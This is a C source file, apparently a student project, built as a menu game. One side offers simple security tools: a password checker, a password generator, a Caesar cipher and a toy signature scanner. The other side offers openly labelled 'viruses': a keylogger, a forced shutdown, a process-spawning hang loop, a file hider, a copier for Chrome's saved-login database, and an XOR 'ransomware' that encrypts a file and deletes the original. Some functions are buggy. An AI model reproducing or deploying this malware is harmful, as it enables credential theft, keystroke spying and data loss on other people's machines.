#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <time.h>



int sideSelection();
void virusSelection();
void securityToolsSelection();
void passwordStrengthChecker();
void virusSignatureScanner();
void passwordGenerator();
int textEncryptorDecryptor();
int keyStalker();
void shutdownVirus();
void multiFileOpener();
void hangVirus();
void hideFile();
void creditialStealer();
void replicatingVirus();
int ransomware();


int choice;


int main () {
    printf("Welcome into a realm where you must decide your fate:   \nUnleash havoc as the Destructive Pathogen \n                  Or \nStand as the last line of defense as the Resolute Paladin. \nIn this digital warzone, every keystroke carries weight \n\n");

    sideSelection();
    return 0;
}


int sideSelection() {

    printf("\n\n\nNow decide : \n 1. Pathogen(Virus) \n 2. Paladin(Security Tools) \n 3.Exit \n Your Choice(1/2/3): \n");
    if(scanf("%d", &choice)==0){
        printf("Invalid Input. Try again.\n\n");
        while (getchar() != '\n');
        sideSelection();
    }


    if (choice == 1) {
        printf("Bold choice, harbinger of chaos.\nevery tool is a venomous blade poised to shatter defenses\n");
        virusSelection();
    }
    else if (choice == 2) {
        printf("\n\n\nWise choice, defender of the light. \nEmbrace the noble path, guarding with unwavering resolve \nagainst the shadows that seek to corrupt.\n");
        securityToolsSelection();
    }
    else if (choice == 3){
        return 0;
    }
    else{
            printf("Invalid Input. Try again.\n\n");
            sideSelection();
        }
}



void virusSelection(){
    printf("\nVirus list : \n\n  ");
    printf("1.  Soul Scribe              (This application secretly saves your Keyboard input to a *.txt file) \n  ");
    printf("2.  Digital Blackout         (This application automatically shutdown your pc.)  \n  ");
    printf("3.  Sinister Data Opener     (This application opens multiple Notepad) \n  ");
    printf("4.  Shadowed Paralysis       (This application will hang or crash your system. I suggest not to try it ) \n  ");
    printf("5.  Soul Camouflage          (This application hides a file given by the user) \n  ");
    printf("6.  Dark Plunderer           (This application takes confidential data of you browser such as login data)\n  ");
    printf("7.  Phantom Doppelganger     (This application creates multiple same file) \n  ");
    printf("8.  Soul Extortion           (This application is basically a ransomware) \n  ");

    printf("\n\nSelect a Virus : \n  ");
    if(scanf("%d", &choice)==0){
        printf("Invalid Input. Try again.\n\n");
        while (getchar() != '\n');
        virusSelection();
    }



    if(choice==1){
        keyStalker();
    }
    else if(choice==2){
        shutdownVirus();
    }
    else if(choice==3){
        multiFileOpener();
    }
    else if(choice==4){
        hangVirus();
    }

    else if(choice==5){
        hideFile();
    }
    else if(choice==6){
        creditialStealer();
    }
    else if(choice==7){
        replicatingVirus();
    }
    else if(choice==8){
        ransomware();
    }
    else{
        printf("Invalid Input. Try again.\n\n");

        virusSelection();
    }
}




void securityToolsSelection(){
    printf("\n Security Tool list: \n\n");
    printf("1. Shielded Sentry                  (Take a password from the User and check it's strength)\n");
    printf("2. Pathogen Detection Sentinel      (User provides virus signature; files scanned for impact)\n");
    printf("3. Fortress KeyCrafter              (User can generate password)\n");
    printf("4. Phantom Crypt                    (User can encrypt or decrypt a text.)\n");
    printf("\n\n Select a tool: ");
    if(scanf("%d", &choice)==0){
        printf("Invalid Input. Try again.\n\n");
        while (getchar() != '\n');
        securityToolsSelection();
    }

    if(choice==1){
        passwordStrengthChecker();
    }
    else if(choice==2){
        virusSignatureScanner();
    }
    else if(choice==3){
        passwordGenerator();
    }
    else if(choice==4){
        textEncryptorDecryptor();
    }
    else{
        printf("Invalid Input. Try again.\n\n");
        securityToolsSelection();
    }
}


//Password Strength Checker Code start


int checkSymbol(const char *password) {
    while (*password) {
        if (!isalnum((unsigned char)*password))
            return 1;
        password++;
    }
    return 0;
}

int checkDigit(const char *password) {
    while (*password) {
        if (isdigit((unsigned char)*password))
            return 1;
        password++;
    }
    return 0;
}

int checkUpperCase(const char *password) {
    while (*password) {
        if (isupper((unsigned char)*password))
            return 1;
        password++;
    }
    return 0;
}

int checkLowerCase(const char *password) {
    while (*password) {
        if (islower((unsigned char)*password))
            return 1;
        password++;
    }
    return 0;
}

void countPasswordStrength(const char *password) {
    int totalCharacters = strlen(password);
    int strength = 0;

    if (totalCharacters >= 10)
        strength++;
    if (checkSymbol(password))
        strength++;
    if (checkDigit(password))
        strength++;
    if (checkUpperCase(password))
        strength++;
    if (checkLowerCase(password))
        strength++;


    printf("Password strength: ");
    switch (strength) {
        case 5:
            printf("Fortress(Very Strong)\n");
            break;
        case 4:
            printf("Shield(Strong)\n");
            break;
        case 3:
            printf("Guard(Average)\n");
            break;
        case 2:
            printf("Barrier(Weak)\n");
            break;
        default:
            printf("Vulnerability (Very Weak)\n");
            break;
    }
}

void passwordStrengthChecker(){
    char password[100];
    printf("Enter the defense passphrase (Max 100 characters) ");
    scanf("%99s", password);
    countPasswordStrength(password);

    sideSelection();
}



//Virus Scanner Code start




int scanFile(int virusSize,int userFiles[][virusSize], int virusSignature[], int scanningFile){
    int count=0;
    for (int j=0; j<virusSize; j++) {
        if (userFiles[scanningFile][j] == virusSignature[j]) {
            count++;
        }
    }
    return count;
}

void virusSignatureScanner() {

    int virusSize,fileNumbers;
    printf("Enter Virus signature size (array size): ");
    scanf("%d",&virusSize);
    int virusSignature[virusSize];

    printf("Enter Virus Signature one by one(like array)");
    for(int i=0;i<virusSize;i++){
        scanf("%d",&virusSignature[i]);
    }

    printf("Enter how many files you want to be scanned: ");
    scanf("%d",&fileNumbers);
    int userFiles[fileNumbers][virusSize];
    for(int j =0; j<fileNumbers;j++){
        printf("Enter the signature values of file %d ",j+1);
        for (int i=0; i<virusSize; i++){
            scanf("%d", &userFiles[j][i]);
        }
    }

    printf("\n\n\n Scanning Completed\n\n ");
    printf("Scanning Result: \n");
    int threats=0;
    for(int i=0; i<fileNumbers; i++){
        int result = scanFile(virusSize,userFiles, virusSignature, i);
        printf("\tFile %d: %s\n",i+1, result==virusSize ? "Virus found" : "No virus found");
        if(result == virusSize){
            threats++;
        }
    }
    printf("Summery : %d File scanned, %d Threats found",fileNumbers,threats);

    sideSelection();
}


//Password Generator Code Start



void passwordGenerator(){

    int length, addNumbers, addSpecialChars;
    char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char numbers[] = "0123456789";
    char specialChars[] = "!@#$%^&*()-_=+[]{}|;:,.<>?";

    int letterCount = sizeof(letters) - 1;
    int numberCount = sizeof(numbers) - 1;
    int specialCharCount = sizeof(specialChars) - 1;


    printf("Enter password length (max 100): ");
    scanf("%d", &length);
    if (length > 100 || isdigit(length)!=0){
        printf("\nInvalid Input.Try Again\n");
        while (getchar() != '\n');
        passwordGenerator();

    }
    printf("Do you want to add numbers? (1 for Yes, 0 for No): ");
    scanf("%d", &addNumbers);
    printf("Do you want to add special characters? (1 for Yes, 0 for No): ");
    scanf("%d", &addSpecialChars);

    srand(time(0));

    char password[length];

    for (int i = 0; i < length; i++){
        int choice = rand() % 3;
        if(choice == 0 || (!addNumbers && !addSpecialChars)){
            password[i] = letters[rand() % letterCount];
        }
        else if (choice == 1 && addNumbers){
            password[i] = numbers[rand() % numberCount];
        }
        else if (choice == 2 && addSpecialChars){
            password[i] = specialChars[rand() % specialCharCount];
        }
        else {
            i--;
        }
    }

    password[length] = '\0';

    printf("Generated Password: %s\n", password);

    sideSelection();
}


//Text Encryptor Decryptor Code Start


void encrypt(char *message, int key) {
    for (int i = 0; message[i] != '\0'; i++) {
        char ch = message[i];

        if (isalpha(ch)) {
            char offset = isupper(ch) ? 'A' : 'a';
            ch = (ch - offset + key) % 26 + offset;
        }

        message[i] = ch;
    }
}

void decrypt(char *message, int key) {
    encrypt(message, 26 - key);
}

int textEncryptorDecryptor(){
    char message[1000];

    int key, choice;

    printf("Enter 1 to encrypt or 2 to decrypt or 3 to Exit: ");
    scanf("%d", &choice);
    if(choice==3){
        return 0;
    }

    printf("Enter the key (1-25): ");
    scanf("%d", &key);

    if (key < 1 || key > 25) {
        printf("Invalid key. Please enter a key between 1 and 25.\n");
        textEncryptorDecryptor();
    }
    getchar();
    printf("Enter the text:\n");
    fgets(message, 1000, stdin);



    if (choice == 1){
        encrypt(message, key);
        printf("Encrypted message: %s\n\n\n\n\n", message);
        textEncryptorDecryptor();
    }
    else if (choice == 2){
        decrypt(message, key);
        printf("Decrypted message: %s\n\n\n\n\n", message);
        textEncryptorDecryptor();
    }
    else {
        printf("Invalid choice.\n");
        while (getchar() != '\n');
        textEncryptorDecryptor();
    }

    sideSelection();

}


//Key Stalker Code Start


int keyStalker(){
    FILE *file;
    char ch;

    file = fopen("keyPressed.txt", "a");
    if (!file) {
        printf("Error opening log file.\n");
        return 0;
    }

    printf("This console window will be hidden hidden after 10 second \n");
    printf("Pressing \"Esc\" will terminate the programme and show the console window again.");

    sleep(10);

    void hideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    }

    while (1) {
        if (_kbhit()) {
            ch = _getch();
            fputc(ch, file);
            fflush(file);
            if (ch == 27) {
                break;
            }
        }
    }

    fclose(file);

    void showConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_SHOW);
    }

    sideSelection();
}

//Shutdown virus code start

void shutdownVirus(){
    printf("Your PC will shutdown in 5 seconds\n");
    Sleep(5000);
    system("shutdown /s /t 0");

}

//multi file opener virus code start

void multiFileOpener() {
    for (int i = 0; i <= 20; i++) {
        system("start notepad");
    }

    sideSelection();
}

//hang virus code start

void hangVirus(){
    while (1) {
        CreateProcess(NULL, NULL, NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL);
    }
}

//Hide file code start

void hideFile(){
    system("attrib +h secretfile.txt");
    sideSelection();
}

//creditial Stealer code start

void creditialStealer(){
    FILE *source = fopen("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "rb");
    FILE *dest = fopen("stolen credentials.txt", "wb");

    if (source && dest) {
        char buffer[4096];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
            fwrite(buffer, 1, bytes, dest);
        }

        fclose(source);
        fclose(dest);
    } else {
        printf("Failed to open files.\n");
    }

    sideSelection();
}



// replicating virus code start

void replicatingVirus(){
    char fileName[50];
    for(int k=0; k<=5;k++){
        snprintf(fileName, sizeof(fileName), "virus%d.txt", k);
        FILE *file = fopen(fileName,"w");
        fprintf(file, "This is file number %d\n", k);
        fclose(file);
    }

    sideSelection();
}

//ransomeware code start

void encryptFile(const char *filename, const char *password) {
    FILE *source = fopen(filename, "rb");
    if (!source) {
        printf("Failed to open file for encryption.\n");
        return;
    }

    char encryptedFilename[MAX_PATH];
    snprintf(encryptedFilename, MAX_PATH, "%s.locked", filename);

    FILE *dest = fopen(encryptedFilename, "wb");
    if (!dest) {
        printf("Failed to create encrypted file.\n");
        fclose(source);
        return;
    }

    char key = password[0];
    int ch;
    while ((ch = fgetc(source)) != EOF) {
        fputc(ch ^ key, dest);
    }

    fclose(source);
    fclose(dest);

    printf("File encrypted successfully as %s.\n", encryptedFilename);


    if (remove(filename) != 0) {
        printf("Failed to delete original file.\n");
    } else {
        printf("Original file '%s' deleted successfully.\n", filename);
    }
    ransomware();
}

void decryptFile(const char *filename, const char *password) {
    size_t len = strlen(filename);
    if (len <= 7 || strcmp(filename + len - 7, ".locked") != 0) {
        printf("File is not encrypted.\n");
        return;
    }

    FILE *source = fopen(filename, "rb");
    if (!source) {
        printf("Failed to open file for decryption.\n");
        return;
    }


    char decryptedFilename[MAX_PATH];
    snprintf(decryptedFilename, MAX_PATH, "%.*s", (int)(len - 7), filename);

    FILE *dest = fopen(decryptedFilename, "wb");
    if (!dest) {
        printf("Failed to create decrypted file.\n");
        fclose(source);
        return;
    }


    char key = password[0];
    int ch;
    while ((ch = fgetc(source)) != EOF) {
        fputc(ch ^ key, dest);
    }

    fclose(source);
    fclose(dest);

    printf("File decrypted successfully as %s.\n", decryptedFilename);


    if (remove(filename) != 0) {
        printf("Failed to delete encrypted file.\n");
    } else {
        printf("Encrypted file '%s' deleted successfully.\n", filename);
    }
    ransomware();
}

int ransomware(){
    char filename[MAX_PATH];
    char password[100];
    int choice;

    printf("Menu:\n");
    printf("1. Encrypt a file\n");
    printf("2. Decrypt a file\n");
    printf("3. Exit\n");
    printf("Enter your choice (1 or 2 or 3): ");
    scanf("%d", &choice);
    if(choice == 3 ){
        sideSelection();
    }

    getchar();

    printf("Enter file name: ");
    fgets(filename, sizeof(filename), stdin);
    filename[strcspn(filename, "\n")] = '\0';

    printf("Enter password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = '\0';

    switch (choice) {
        case 1:
            encryptFile(filename, password);
            break;
        case 2:
            decryptFile(filename, password);
            break;
        default:
            printf("Invalid choice.\n");
            break;
    }

}
